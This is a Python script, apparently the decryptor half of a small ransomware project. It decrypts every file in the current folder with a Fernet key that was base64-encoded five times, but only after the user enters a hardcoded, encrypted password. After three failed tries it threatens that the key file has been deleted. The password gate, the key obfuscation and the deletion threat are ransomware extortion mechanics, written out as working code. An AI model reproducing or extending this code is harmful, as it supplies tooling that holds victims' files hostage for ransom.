import os, ctypes, base64, time
from cryptography.fernet import Fernet

def decrypt():
    # Scan files in current folder
    files = []
    for file in os.listdir():
        if file == "encrypt.py" or file == "key.key" or file == "decrypt.py" or file == "test.py":
            continue
        if os.path.isfile(file):
            files.append(file)

    with open("key.key", "rb") as key:
        secret_key = key.read()

    # decrypt key
    i = 1
    while i <= 5:
        secret_key = base64.b64decode(secret_key)
        # print(secret_key)  # test
        i = i + 1

    # decrypt files
    try:
        for file in files:
            with open(file, "rb")as thefile:
                contents = thefile.read()
                contents_decrypted = Fernet(secret_key).decrypt(contents)
            with open(file, "wb") as thefile:
                thefile.write(contents_decrypted)
    except:
        print("failed")

#add password before encryption
key = "cnhU-NAeF-OsVSUrksfRzzMq_zyZbBlQMI3za0Hv4Ww=".encode("utf-8")
passwd = "gAAAAABimMtjNnSA6K3wvcMVKMIlL1s9-ms1eJwUyfg_vOhhQqTH7vhocyxRuunZ3ThsIPa35Wg5J-od5vvvzh90t8QefnU49w==".encode("utf-8")
passwd_dc = Fernet(key).decrypt(passwd).decode("utf-8")
count = 3
while True:
    user_input = input("Enter the super secret password:\n -> ")
    if user_input == passwd_dc:
        print("Password correct, your files are now decrypted.")
        decrypt()
        time.sleep(1)
        exit()
    else:
        if count <= 1:
            print("the keyfile has been deleted.")
            # add part to delete key.key
            exit()
        else:
            count = count - 1
            print("try again\n\n")
            print("You only have ", count, " chances left...")
